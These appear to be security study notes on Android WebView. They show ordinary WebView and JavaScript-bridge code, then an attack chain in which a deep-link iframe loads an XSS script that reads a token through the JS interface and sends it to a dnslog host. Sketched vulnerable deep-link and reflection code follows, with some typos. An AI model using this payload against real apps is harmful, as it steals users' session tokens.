# Webview
WebView objects allow you to display web content as part of your activity layout, but lack some of the features of fully-developed browsers. 

## Use Case
To load a web page in the WebView, use loadUrl():
```java
WebView myWebView = (WebView) findViewById(R.id.webview);
myWebView.loadUrl("http://www.example.com");
```

```java
WebView myWebView = new WebView(activityContext);
setContentView(myWebView);
myWebView.loadUrl("https://www.example.com");
```

## Javascript code
### Enable JavaScript
```java
WebSettings webSettings = myWebView.getSettings();
webSettings.setJavaScriptEnabled(true);
```

### Binding JavaScript 
Create interfaces between your JavaScript code and client-side Android code. To bind a new interface between your JavaScript and Android code, call _addJavascriptInterface()_, passing it a class instance to bind to your JavaScript and an interface name that your JavaScript can call to access the class.
```java
public class WebAppInterface {
    Context mContext;

    /** Instantiate the interface and set the context */
    WebAppInterface(Context c) {
        mContext = c;
    }

    /** Show a toast from the web page */
    @JavascriptInterface
    public void showToast(String toast) {
        Toast.makeText(mContext, toast, Toast.LENGTH_SHORT).show();
    }
}
```
Bind this class to the JavaScript that runs in your WebView with addJavascriptInterface() and name the interface Android
```java
WebView webView = (WebView) findViewById(R.id.webview);
webView.addJavascriptInterface(new WebAppInterface(this), "Android");
```
Then web application has access to the WebAppInterface class, you can write a HTML and Javascript code to use the interface:
```java
<input type="button" value="Say hello" onClick="showAndroidToast('Hello Android!')" />

<script type="text/javascript">
    function showAndroidToast(toast) {
        Android.showToast(toast);
    }
</script>
```


## Process
```mermaid
graph TD;
    Evil-html-->Call-by-DeepLink-Scheme;
    Call-by-DeepLink-Scheme-->Activity;
    Activity-->WebView;
    WebView-->Execute-JS;
    XSS-in-WhiteList-->Execute-JS;
    Execute-JS-->JsInterface;
    JsInterface-->window.getToken;
    JsInterface-->window.downloadFile;
    window.getToken-->Java-interface;
    window.downloadFile-->Java-interface;
```
## payload
- Evil.html
```html
<iframe src= "jayway://openapp/activity?param= {"activity": "com.jayway.JsBridge", "url": "http://whitelist.com/xss=exploit.js"} ">
```
- exploit.js
```javascript
function evil(){
   var data = window.JsInterface.getToken();
   document.body.appendCild(document.createElement("img")).src= "http://xx.dnslog.cn?data=" + data;
  }
```
- Result: Accesslog of dnslog.cn
```
 GET /data={Token="xxxxx"}
```

## Code
- DeepLink Attack Input
```java
public static deeplink(){
 Intent intent = this.getIntent();
 Uri uri = intent.getData();
 String scheme = uri.getScheme();
 String host = uri.getHost();
 if (scheme = "jayway" && host = "openapp") 
    param = uri.getQueryParameter("param");
}
   WebView webView = new Webview();
   WebSettings webSettings = webView.getSettings();
   webSettings.setJavaScriptEnabled(true);
# case 1 : parse any url  
   webView.loadUrl(param);
# case 2 : load any activity by deeplink
   Intent intent2 = new Intent();
   intent2.setData(Uri.parse(param));  #User-controlled
   this.startActivity(intent2);
```

- Malicious Activity
```java
private boolean rce(){
 Intent intent = this.getgetIntent();
 String str = intent.getStringExtra("param2");
 this.a = Class.forName(str).newInstance;
}
```

- JsBridge
```java
1. Get sensitive info
@JavascriptInterface
public String getKey(){
 if (com.jayway.utils.isWhiteList(this.url)){
   String json = new JsonObject();
   String token = com.jayway.info.getInstance().getToken();
   json.put("token",token)
   return json.toString();  
  }
}
```




- [2020 看雪SDC议题回顾 | Android WebView安全攻防指南2020](https://zhuanlan.kanxue.com/article-14155.htm)
